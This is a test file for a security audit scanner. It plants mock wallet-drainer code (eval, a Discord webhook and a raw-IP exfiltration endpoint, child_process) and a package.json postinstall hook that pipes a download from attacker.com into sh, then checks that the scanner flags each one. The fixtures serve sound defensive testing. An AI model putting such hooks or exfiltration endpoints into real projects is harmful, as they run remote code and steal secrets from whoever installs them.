import { describe, it, expect } from "vitest";
import { runSecurityAudit } from "../scripts/security-audit.mjs";
import fs from "node:fs";
import path from "node:path";
import os from "node:os";

describe("Autonomous Anti-Drainer Security Audit Scanner", () => {
  it("should pass cleanly on the production codebase", () => {
    const violations = runSecurityAudit(process.cwd());
    expect(violations).toEqual([]);
  });

  it("should catch and flag simulated wallet drainer and exfiltration exploits", () => {
    // Create a temporary sandbox directory with malicious mock code
    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), "agentrail-security-test-"));
    const srcDir = path.join(tmpDir, "src");
    fs.mkdirSync(srcDir, { recursive: true });

    // Inject 4 distinct malicious attacker techniques:
    // 1. Dynamic code evaluation (backdoor unpacker)
    // 2. Secret exfiltration to discord webhook
    // 3. Subprocess shell execution
    // 4. Raw IP C2 communication
    const maliciousCode = `
      export function maliciousHelper(privateKey: string) {
        // Attack 1: Dynamic eval
        eval("globalThis.stealth = 1;");

        // Attack 2: Exfiltrate key to discord webhook
        const webhook = "https://discord.com/api/webhooks/12345/attacker_token";

        // Attack 3: Shell command execution
        const cp = require("child_process");

        // Attack 4: Raw IP outbound communication
        const c2 = "http://192.168.1.100/exfil";
        return webhook;
      }
    `;

    fs.writeFileSync(path.join(srcDir, "drainer_exploit.ts"), maliciousCode, "utf-8");

    const violations = runSecurityAudit(tmpDir);

    expect(violations.length).toBeGreaterThanOrEqual(4);
    const rules = violations.map((v) => v.rule);
    expect(rules).toContain("NO_EVAL_OR_DYNAMIC_EXECUTION");
    expect(rules).toContain("NO_WEBHOOK_OR_C2_EXFILTRATION");
    expect(rules).toContain("NO_CHILD_PROCESS_EXEC");
    expect(rules).toContain("NO_RAW_IP_ENDPOINT_CALLS");

    // Clean up temporary sandbox
    fs.rmSync(tmpDir, { recursive: true, force: true });
  });

  it("should catch malicious npm postinstall scripts in package.json", () => {
    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), "agentrail-pkg-test-"));
    fs.mkdirSync(path.join(tmpDir, "src"), { recursive: true });

    const maliciousPkg = {
      name: "tampered-package",
      scripts: {
        postinstall: "curl -s http://attacker.com/payload | sh"
      }
    };

    fs.writeFileSync(path.join(tmpDir, "package.json"), JSON.stringify(maliciousPkg, null, 2), "utf-8");

    const violations = runSecurityAudit(tmpDir);
    expect(violations.length).toBe(1);
    expect(violations[0].rule).toBe("NO_DANGEROUS_LIFECYCLE_SCRIPTS");
    expect(violations[0].severity).toBe("CRITICAL");

    fs.rmSync(tmpDir, { recursive: true, force: true });
  });
});
